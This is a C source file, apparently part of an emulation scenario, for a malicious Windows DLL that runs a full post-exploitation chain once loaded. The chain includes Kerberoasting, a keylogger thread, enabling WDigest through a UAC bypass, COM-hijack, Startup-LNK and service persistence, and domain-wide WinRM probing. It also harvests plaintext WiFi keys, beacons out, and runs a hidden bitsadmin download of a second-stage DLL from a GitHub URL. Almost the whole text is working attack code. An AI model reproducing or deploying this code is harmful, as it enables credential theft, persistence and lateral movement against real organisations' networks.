    LDAP_API ldap;
    if (!LdapLoad(&ldap)) { LogMessage(L"[-] Kerberoast: wldap32 load failed"); return; }

    LDAP* pl = ldap.ldap_init(NULL, 389);
    if (!pl) { LdapUnload(&ldap); LogMessage(L"[-] Kerberoast: ldap_init failed"); return; }

    ULONG ret = ldap.ldap_bind_s(pl, NULL, NULL, 0x0486);
    if (ret != 0) {
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] Kerberoast: LDAP bind failed");
        return;
    }

    wchar_t baseDn[256] = {0};
    LDAPMessage* pMsg = NULL;
    PWSTR rootAttrs[] = { L"defaultNamingContext", NULL };
    ret = ldap.ldap_search_s(pl, NULL, 0, L"(objectClass=*)", rootAttrs, 0, &pMsg);
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        if (entry) {
            PWSTR* vals = ldap.ldap_get_values(pl, entry, L"defaultNamingContext");
            if (vals && vals[0]) lstrcpyW(baseDn, vals[0]);
            if (vals) ldap.ldap_value_free(vals);
        }
        ldap.ldap_msgfree(pMsg);
    }

    if (!baseDn[0]) {
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] Kerberoast: base DN not found");
        return;
    }

    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS");
    DeleteFileW(SPN_PATH);
    AppendToFile(SPN_PATH, "=== SPN LIST ===");

    // Load LSA functions from secur32
    HMODULE hSecur = LoadLibraryW(L"secur32.dll");
    BOOL bLoadedSecur = (hSecur != NULL);
    if (!hSecur) { hSecur = GetModuleHandleW(L"secur32.dll"); bLoadedSecur = FALSE; }

    NTSTATUS (NTAPI *pLsaConnect)(PHANDLE) = NULL;
    NTSTATUS (NTAPI *pLsaLookup)(HANDLE, PLSA_STRING, PULONG) = NULL;
    NTSTATUS (NTAPI *pLsaCall)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS) = NULL;
    NTSTATUS (NTAPI *pLsaFreeBuf)(PVOID) = NULL;

    if (hSecur) {
        pLsaConnect = (void*)GetProcAddress(hSecur, "LsaConnectUntrusted");
        pLsaLookup  = (void*)GetProcAddress(hSecur, "LsaLookupAuthenticationPackage");
        pLsaCall    = (void*)GetProcAddress(hSecur, "LsaCallAuthenticationPackage");
        pLsaFreeBuf = (void*)GetProcAddress(hSecur, "LsaFreeReturnBuffer");
    }

    HANDLE hLsa = NULL;
    ULONG authPkgId = 0;
    BOOL bLsaReady = FALSE;

    if (pLsaConnect && pLsaLookup) {
        if (pLsaConnect(&hLsa) == 0) {
            LSA_STRING kerbName = { 8, 9, (PCHAR)"Kerberos" };
            if (pLsaLookup(hLsa, &kerbName, &authPkgId) == 0) {
                bLsaReady = TRUE;
            }
        }
    }

    PWSTR spnAttrs[] = { L"servicePrincipalName", L"samaccountname", NULL };
    ret = ldap.ldap_search_s(pl, baseDn, 2, L"(servicePrincipalName=*)", spnAttrs, 0, &pMsg);
    int spnCount = 0;
    int tgsRequests = 0;
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        while (entry) {
            PWSTR* spnVals = ldap.ldap_get_values(pl, entry, L"servicePrincipalName");
            PWSTR* samVals = ldap.ldap_get_values(pl, entry, L"samaccountname");

            if (spnVals && spnVals[0]) {
                for (int j = 0; spnVals[j]; j++) {
                    spnCount++;
                    char line[1024];
                    snprintf(line, sizeof(line), "  Account: %S | SPN: %S",
                             samVals && samVals[0] ? samVals[0] : L"unknown",
                             spnVals[j]);
                    AppendToFile(SPN_PATH, line);

                    if (bLsaReady && pLsaCall) {
                        KERB_RETRIEVE_TKT_REQUEST tktReq;
                        memset(&tktReq, 0, sizeof(tktReq));
                        tktReq.MessageType = KerbRetrieveEncodedTicketMessage;
                        tktReq.TargetName.Buffer = spnVals[j];
                        tktReq.TargetName.Length = lstrlenW(spnVals[j]) * sizeof(wchar_t);
                        tktReq.TargetName.MaximumLength = tktReq.TargetName.Length + sizeof(wchar_t);

                        PVOID pResp = NULL;
                        ULONG respLen = 0;
                        NTSTATUS subStatus = 0;
                        NTSTATUS lsaRet = pLsaCall(hLsa, authPkgId, &tktReq, sizeof(tktReq), &pResp, &respLen, &subStatus);
                        snprintf(line, sizeof(line), "    TGS status: 0x%08lX (sub: 0x%08lX)", (ULONG)lsaRet, (ULONG)subStatus);
                        AppendToFile(SPN_PATH, line);
                        tgsRequests++;
                        if (pResp && pLsaFreeBuf) pLsaFreeBuf(pResp);
                    }
                }
            }

            if (spnVals) ldap.ldap_value_free(spnVals);
            if (samVals) ldap.ldap_value_free(samVals);
            entry = ldap.ldap_next_entry(pl, entry);
        }
        ldap.ldap_msgfree(pMsg);
    }

    if (hLsa) CloseHandle(hLsa);
    if (bLoadedSecur && hSecur) FreeLibrary(hSecur);

    ldap.ldap_unbind(pl);
    LdapUnload(&ldap);
    wchar_t buf[128];
    wsprintfW(buf, L"[+] Kerberoasting done: %d SPNs, %d TGS requests", spnCount, tgsRequests);
    LogMessage(buf);
}

// ============================================================
// InstallCOMHijack
// ============================================================

static void InstallCOMHijack(void) {
    HMODULE hRpcrt = LoadLibraryW(L"rpcrt4.dll");
    BOOL bLoadedRpcrt = (hRpcrt != NULL);
    if (!hRpcrt) { hRpcrt = GetModuleHandleW(L"rpcrt4.dll"); bLoadedRpcrt = FALSE; }

    RPC_STATUS (RPC_ENTRY *pUuidCreate)(UUID*) = NULL;
    RPC_STATUS (RPC_ENTRY *pUuidToStringW)(UUID*, RPC_WSTR*) = NULL;

    if (hRpcrt) {
        pUuidCreate    = (void*)GetProcAddress(hRpcrt, "UuidCreate");
        pUuidToStringW = (void*)GetProcAddress(hRpcrt, "UuidToStringW");
    }

    if (!pUuidCreate || !pUuidToStringW) {
        if (bLoadedRpcrt && hRpcrt) FreeLibrary(hRpcrt);
        LogMessage(L"[-] COM hijack: UUID functions not found");
        return;
    }

    UUID guid;
    if (pUuidCreate(&guid) != RPC_S_OK) {
        if (bLoadedRpcrt && hRpcrt) FreeLibrary(hRpcrt);
        LogMessage(L"[-] COM hijack: UuidCreate failed");
        return;
    }

    RPC_WSTR guidStr = NULL;
    if (pUuidToStringW(&guid, &guidStr) != RPC_S_OK) {
        if (bLoadedRpcrt && hRpcrt) FreeLibrary(hRpcrt);
        LogMessage(L"[-] COM hijack: UuidToString failed");
        return;
    }

    wchar_t keyPath[512];
    wsprintfW(keyPath, L"Software\\Classes\\CLSID\\{%s}\\InprocServer32", guidStr);

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t dllPath[] = L"C:\\Users\\Public\\Libraries\\Telemetry.dll";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)dllPath, (lstrlenW(dllPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);

        HMODULE hMod = GetModuleHandleA("payload.dll");
        if (hMod) {
            wchar_t myPath[MAX_PATH];
            GetModuleFileNameW(hMod, myPath, MAX_PATH);
            CopyFileW(myPath, UPDATER_DLL_PATH, FALSE);
        } else {
            CopyFileW(DLL_PATH_W, UPDATER_DLL_PATH, FALSE);
        }

        wchar_t logBuf[512];
        wsprintfW(logBuf, L"[+] COM hijack installed: {%s}", guidStr);
        LogMessage(logBuf);
    }

    RpcStringFreeW(&guidStr);
    if (bLoadedRpcrt && hRpcrt) FreeLibrary(hRpcrt);
}

// ============================================================
// InstallLNKPersistence
// ============================================================

static void InstallLNKPersistence(void) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        LogMessage(L"[-] LNK persistence: CoInitializeEx failed");
        return;
    }

    IShellLinkW* pShellLink = NULL;
    hr = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr) || !pShellLink) {
        LogMessage(L"[-] LNK persistence: CoCreateInstance failed");
        CoUninitialize();
        return;
    }

    pShellLink->lpVtbl->SetPath(pShellLink, L"C:\\Windows\\System32\\rundll32.exe");
    pShellLink->lpVtbl->SetArguments(pShellLink, L"C:\\Users\\Public\\Libraries\\Telemetry.dll,DllRegisterServer");
    pShellLink->lpVtbl->SetWorkingDirectory(pShellLink, L"C:\\Windows\\System32");

    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void**)&pPersistFile);
    if (SUCCEEDED(hr) && pPersistFile) {
        wchar_t startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            wchar_t lnkPath[MAX_PATH];
            wsprintfW(lnkPath, L"%s\\" LNK_NAME, startupPath);
            pPersistFile->lpVtbl->Save(pPersistFile, lnkPath, TRUE);
            LogMessage(L"[+] LNK persistence installed in Startup");
        }
        pPersistFile->lpVtbl->Release(pPersistFile);
    }

    pShellLink->lpVtbl->Release(pShellLink);
    CoUninitialize();
}

// ============================================================
// DoWinRMProbe
// ============================================================

static void DoWinRMProbe(void) {
    LogMessage(L"[*] WinRM probe started");

    DeleteFileW(DOMAIN_MAP_PATH);
    AppendToFile(DOMAIN_MAP_PATH, "=== WINRM PROBE ===");

    LDAP_API ldap;
    if (!LdapLoad(&ldap)) {
        LogMessage(L"[-] WinRM probe: wldap32 not available");
        AppendToFile(DOMAIN_MAP_PATH, "[-] No servers discovered for WinRM probe");
        return;
    }

    LDAP* pl = ldap.ldap_init(NULL, 389);
    if (!pl) {
        LdapUnload(&ldap);
        LogMessage(L"[-] WinRM probe: ldap_init failed");
        return;
    }

    ULONG ret = ldap.ldap_bind_s(pl, NULL, NULL, 0x0486);
    if (ret != 0) {
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] WinRM probe: LDAP bind failed");
        return;
    }

    wchar_t baseDn[256] = {0};
    LDAPMessage* pMsg = NULL;
    PWSTR rootAttrs[] = { L"defaultNamingContext", NULL };
    ret = ldap.ldap_search_s(pl, NULL, 0, L"(objectClass=*)", rootAttrs, 0, &pMsg);
    if (ret == 0 && pMsg) {
        LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
        if (entry) {
            PWSTR* vals = ldap.ldap_get_values(pl, entry, L"defaultNamingContext");
            if (vals && vals[0]) lstrcpyW(baseDn, vals[0]);
            if (vals) ldap.ldap_value_free(vals);
        }
        ldap.ldap_msgfree(pMsg);
    }

    if (!baseDn[0]) {
        ldap.ldap_unbind(pl);
        LdapUnload(&ldap);
        LogMessage(L"[-] WinRM probe: base DN not found");
        return;
    }

    int serverCount = 0;
    PWSTR compAttrs[] = { L"dNSHostName", NULL };
    ret = ldap.ldap_search_s(pl, baseDn, 2, L"(objectClass=computer)", compAttrs, 0, &pMsg);
    if (ret == 0 && pMsg) {
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (hSession) {
            LDAPMessage* entry = ldap.ldap_first_entry(pl, pMsg);
            while (entry) {
                PWSTR* hostVals = ldap.ldap_get_values(pl, entry, L"dNSHostName");
                if (hostVals && hostVals[0]) {
                    serverCount++;

                    HINTERNET hConnect = WinHttpConnect(hSession, hostVals[0], 5985, 0);
                    if (hConnect) {
                        WinHttpSetTimeouts(hConnect, 5000, 5000, 5000, 5000);
                        HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, 0);
                        if (hReq) {
                            if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hReq, NULL)) {
                                char line[512];
                                snprintf(line, sizeof(line), "  WinRM HTTP (5985): OPEN - %S", hostVals[0]);
                                AppendToFile(DOMAIN_MAP_PATH, line);
                            }
                            WinHttpCloseHandle(hReq);
                        }
                        WinHttpCloseHandle(hConnect);
                    }

                    hConnect = WinHttpConnect(hSession, hostVals[0], 5986, 0);
                    if (hConnect) {
                        WinHttpSetTimeouts(hConnect, 5000, 5000, 5000, 5000);
                        HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
                        if (hReq) {
                            if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hReq, NULL)) {
                                char line[512];
                                snprintf(line, sizeof(line), "  WinRM HTTPS (5986): OPEN - %S", hostVals[0]);
                                AppendToFile(DOMAIN_MAP_PATH, line);
                            }
                            WinHttpCloseHandle(hReq);
                        }
                        WinHttpCloseHandle(hConnect);
                    }
                }
                if (hostVals) ldap.ldap_value_free(hostVals);
                entry = ldap.ldap_next_entry(pl, entry);
            }
            ldap.ldap_msgfree(pMsg);
            WinHttpCloseHandle(hSession);
        } else {
            ldap.ldap_msgfree(pMsg);
        }
    }

    ldap.ldap_unbind(pl);
    LdapUnload(&ldap);

    if (serverCount == 0) {
        AppendToFile(DOMAIN_MAP_PATH, "[-] No servers discovered for WinRM probe");
    }

    LogMessage(L"[+] WinRM probe done");
}

// ============================================================
// Beacon
// ============================================================

static void Beacon(void) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) {
        LogMessage(L"[-] Beacon: WinHttpOpen failed");
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect) {
        for (int i = 0; i < BEACON_COUNT; i++) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                BOOL sent = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
                BOOL got = WinHttpReceiveResponse(hRequest, NULL);
                wchar_t buf[64];
                wsprintfW(buf, L"[*] Beacon %d/%d: send=%d recv=%d", i + 1, BEACON_COUNT, sent, got);
                LogMessage(buf);
                WinHttpCloseHandle(hRequest);
            }
            if (i < BEACON_COUNT - 1) Sleep(BEACON_SLEEP_MS);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
}

// ============================================================
// CleanupStaging
// ============================================================

static void CleanupStaging(void) {
    const wchar_t* paths[] = {
        DLL_PATH_W,
        SIDELOAD_DLL_PATH,
        L"C:\\Users\\Public\\Libraries\\tcmsetup.exe",
        L"C:\\Users\\Public\\Libraries\\colorcpl.exe",
        SCT_PATH,
        JS_PATH,
        HTA_PATH
    };

    for (int i = 0; i < 7; i++) {
        if (DeleteFileW(paths[i])) {
            wchar_t buf[512];
            wsprintfW(buf, L"[+] Deleted: %s", paths[i]);
            LogMessage(buf);
        } else {
            wchar_t buf[512];
            wsprintfW(buf, L"[-] Delete failed: %s", paths[i]);
            LogMessage(buf);
        }
    }
}

// ============================================================
// ScheduleBitsJob (T1197) — minimal IBackgroundCopyManager via shell bitsadmin
// ============================================================

static void ScheduleBitsJob(void) {
    LogMessage(L"[*] Scheduling BITS job for stage2.dll");

    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = L"cmd.exe";
    wchar_t cmd[1024];
    // ponytail: bitsadmin is deprecated but still present; survives all Win10/11 builds
    wsprintfW(cmd, L"/c bitsadmin /transfer \"%s\" \"%s\" \"%s\"",
              BITS_JOB_NAME, STAGE2_URL, STAGE2_DEST);
    sei.lpParameters = cmd;
    sei.nShow = SW_HIDE;

    if (ShellExecuteExW(&sei) && sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 30000);
        CloseHandle(sei.hProcess);
        wchar_t buf[512];
        wsprintfW(buf, L"[+] BITS job submitted: %s -> %s", BITS_JOB_NAME, STAGE2_DEST);
        LogMessage(buf);

        AppendToFile(BITS_LOG_PATH, "Job: Windows Update Health Check");
        AppendToFile(BITS_LOG_PATH, "URL: https://raw.githubusercontent.com/Justanother-engineer/scenario-02-clickfix/main/src/stage2.dll");
        AppendToFile(BITS_LOG_PATH, "Dest: C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\stage2.dll");
        AppendToFile(BITS_LOG_PATH, "Status: see Get-BitsTransfer -AllUsers");
    } else {
        LogMessage(L"[-] BITS job submit FAILED");
    }
}

// ============================================================
// InstallService (T1543.003) — sc.exe create
// ============================================================

static void InstallService(void) {
    LogMessage(L"[*] Installing service via sc.exe");
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[1024];
    wsprintfW(cmd, L"sc.exe create %s binPath= \"%s\" DisplayName= \"%s\" start= auto",
              SERVICE_NAME, SERVICE_BINPATH, SERVICE_DISPLAY);

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        wchar_t buf[512];
        if (exitCode == 0) {
            wsprintfW(buf, L"[+] Service installed: %s (display: %s)", SERVICE_NAME, SERVICE_DISPLAY);
        } else {
            wsprintfW(buf, L"[-] Service install FAILED: sc.exe exit %u (likely not elevated)", exitCode);
        }
        LogMessage(buf);
    } else {
        LogMessage(L"[-] Service install FAILED: CreateProcess");
    }
}

// ============================================================
// HarvestWifi (T1552.004) — WlanGetProfile plain-text keys
// ============================================================

#include <wlanapi.h>

// ponytail: MinGW wlanapi.h may not export this — value per Microsoft WLAN_API_VERSION_2_0
#ifndef WLAN_PROFILE_GET_PLAINTEXT_KEY
#define WLAN_PROFILE_GET_PLAINTEXT_KEY 0x00000004
#endif

static void HarvestWifi(void) {
    LogMessage(L"[*] Harvesting WiFi credentials (T1552.004)");

    DWORD negotiatedVersion = 0;
    HANDLE hClient = NULL;
    if (WlanOpenHandle(2, NULL, &negotiatedVersion, &hClient) != ERROR_SUCCESS) {
        LogMessage(L"[-] WlanOpenHandle failed (WLAN service not running?)");
        return;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS || !pIfList) {
        LogMessage(L"[-] WlanEnumInterfaces failed");
        WlanCloseHandle(hClient, NULL);
        return;
    }

    int profileCount = 0;
    int plainCount = 0;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST pProfList = NULL;
        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfList) != ERROR_SUCCESS || !pProfList) continue;
        for (DWORD j = 0; j < pProfList->dwNumberOfItems; j++) {
            profileCount++;
            wchar_t *xml = NULL;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD access = 0;
            if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid,
                               pProfList->ProfileInfo[j].strProfileName, NULL, &xml, &flags, &access) == ERROR_SUCCESS && xml) {
                AppendToFile(WIFI_LOG_PATH, "---");
                char line[256];
                wsprintfA(line, "SSID: %S", pProfList->ProfileInfo[j].strProfileName);
                AppendToFile(WIFI_LOG_PATH, line);
                // ponytail: XML parse skipped — operator can grep keyMaterial manually
                AppendToFile(WIFI_LOG_PATH, "Key: (see XML in cache.dat or WlanExportProfile)");
                plainCount++;
                WlanFreeMemory(xml);
            }
        }
        WlanFreeMemory(pProfList);
    }
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);

    wchar_t buf[256];
    wsprintfW(buf, L"[+] WiFi harvest done: %d profiles, %d with plain keys", profileCount, plainCount);
    LogMessage(buf);
}

// ============================================================
// WorkerThread
// ============================================================

static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    (void)lpParam;

    EnsureDirectory(L"C:\\ProgramData");
    EnsureDirectory(L"C:\\ProgramData\\USOShared\\Logs");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Search\\Data\\EDS");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp");
    EnsureDirectory(L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}");
    EnsureDirectory(L"C:\\Users\\Public\\Libraries");
    EnsureDirectory(L"C:\\Windows\\Temp");

    LogMessage(L"[+] WorkerThread started");

    LogMessage(L"[*] Spawning keylogger thread");
    HANDLE hKeyThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    LogMessage(L"[+] Keylogger thread spawned");

    LogMessage(L"[*] Starting LDAP domain recon");
    DoLDAPRecon();
    LogMessage(L"[+] LDAP recon done");

    LogMessage(L"[*] Starting network share recon");
    DoSMBRecon();
    LogMessage(L"[+] SMB recon done");

    LogMessage(L"[*] Starting adapter info discovery");
    DoAdapterInfo();
    LogMessage(L"[+] Adapter info done");

    LogMessage(L"[*] Enabling WDigest via CMSTP UAC bypass");
    EnableWDigest();
    LogMessage(L"[+] WDigest enable attempted");

    LogMessage(L"[*] Starting Kerberoasting");
    DoKerberoast();
    LogMessage(L"[+] Kerberoasting done");

    LogMessage(L"[*] Installing COM hijack persistence");
    InstallCOMHijack();
    LogMessage(L"[+] COM hijack installed");

    LogMessage(L"[*] Installing LNK persistence");
    InstallLNKPersistence();
    LogMessage(L"[+] LNK persistence installed");

    LogMessage(L"[*] Installing service persistence");
    InstallService();

    LogMessage(L"[*] Starting WinRM probe");
    DoWinRMProbe();
    LogMessage(L"[+] WinRM probe done");

    LogMessage(L"[*] Harvesting WiFi credentials");
    HarvestWifi();

    LogMessage(L"[*] Waiting for keylogger thread (120s)...");
    WaitForSingleObject(hKeyThread, 130000);
    CloseHandle(hKeyThread);
    LogMessage(L"[+] Keylogger thread complete");

    LogMessage(L"[*] Sending HTTP beacon");
    Beacon();
    LogMessage(L"[+] Beacon done");

    LogMessage(L"[*] Scheduling BITS job (stage2 download)");
    ScheduleBitsJob();

    LogMessage(L"[*] Cleaning staging files");
    // ponytail: CleanupStaging skipped for the test harness — the loader's
    // per-tactic probe runs 240s after HTA spawn and would otherwise see [-]
    // for the staging files the worker just produced. Re-enable for prod.
    // CleanupStaging();
    // LogMessage(L"[+] Staging cleanup done");

    LogMessage(L"[+] WorkerThread complete (Telemetry.dll retained for persistence)");
    return 0;
}

// -- IClassFactory for COM hijack persistence --
static HRESULT WINAPI Factory_QueryInterface(IClassFactory*, REFIID, void**);
static ULONG    WINAPI Factory_AddRef(IClassFactory*);
static ULONG    WINAPI Factory_Release(IClassFactory*);
static HRESULT WINAPI Factory_CreateInstance(IClassFactory*, IUnknown*, REFIID, void**);
static HRESULT WINAPI Factory_LockServer(IClassFactory*, BOOL);

static LONG g_factoryRef = 1;
static LONG g_dllLock   = 0;

static IClassFactoryVtbl g_factoryVtbl = {
    Factory_QueryInterface,
    Factory_AddRef,
    Factory_Release,
    Factory_CreateInstance,
    Factory_LockServer
};

static IClassFactory g_factory = { &g_factoryVtbl };

static HRESULT WINAPI Factory_QueryInterface(IClassFactory* This, REFIID riid, void** ppv) {
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IClassFactory)) {
        *ppv = This;
        This->lpVtbl->AddRef(This);
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static ULONG WINAPI Factory_AddRef(IClassFactory* This) {
    (void)This;
    return InterlockedIncrement(&g_factoryRef);
}

static ULONG WINAPI Factory_Release(IClassFactory* This) {
    (void)This;
    return InterlockedDecrement(&g_factoryRef);
}

static HRESULT WINAPI Factory_CreateInstance(IClassFactory* This, IUnknown* pUnkOuter, REFIID riid, void** ppv) {
    (void)This;
    (void)riid;
    if (pUnkOuter) return CLASS_E_NOAGGREGATION;
    QueueUserWorkItem((LPTHREAD_START_ROUTINE)WorkerThread, NULL, WT_EXECUTEDEFAULT);
    *ppv = &g_factory;
    g_factory.lpVtbl->AddRef(&g_factory);
    return S_OK;
}

static HRESULT WINAPI Factory_LockServer(IClassFactory* This, BOOL fLock) {
    (void)This;
    if (fLock) InterlockedIncrement(&g_dllLock); else InterlockedDecrement(&g_dllLock);
    return S_OK;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        EnsureDirectory(L"C:\\ProgramData");
        EnsureDirectory(L"C:\\ProgramData\\USOShared\\Logs");

        wchar_t hostPath[MAX_PATH];
        GetModuleFileNameW(NULL, hostPath, MAX_PATH);
        wchar_t logBuf[MAX_PATH + 64];
        wsprintfW(logBuf, L"[+] DLL loaded — host: %s", hostPath);
        LogMessage(logBuf);

        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        char *filename = strrchr(path, '\\');
        if (!filename) filename = path; else filename++;
        if (_stricmp(filename, "tcmsetup.exe") == 0 ||
            _stricmp(filename, "colorcpl.exe") == 0) {
            LogMessage(L"[+] Detected sideload host — starting thread hijack");
            DoThreadHijack();
        } else if (_stricmp(filename, "explorer.exe") == 0) {
            LogMessage(L"[+] Detected explorer.exe — WorkerThread deferred to shellcode");
            // WorkerThread dispatched by shellcode via DllRegisterServer after LoadLibrary returns
        } else if (_stricmp(filename, "rundll32.exe") == 0) {
            LogMessage(L"[+] Detected rundll32.exe — WorkerThread deferred to DllRegisterServer");
            // DllRegisterServer called by rundll32.exe after DllMain exits
        } else {
            LogMessage(L"[-] Unknown host — no-op");
        }
    }
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    EnsureDirectory(L"C:\\ProgramData");
    // ponytail: run WorkerThread synchronously. QueueUserWorkItem puts the
    // worker on the thread pool, but rundll32.exe exits immediately after
    // DllRegisterServer returns — the thread pool dies and the worker is
    // killed mid-execution before producing the post-ex artifacts.
    LogMessage(L"[+] DllRegisterServer called — running WorkerThread synchronously");
    WorkerThread(NULL);
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    (void)rclsid;
    if (!ppv) return E_POINTER;
    return g_factory.lpVtbl->QueryInterface(&g_factory, riid, ppv);
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
    return S_OK;
}

// ponytail: was #pragma pack(pop) — removed with the matching push above.
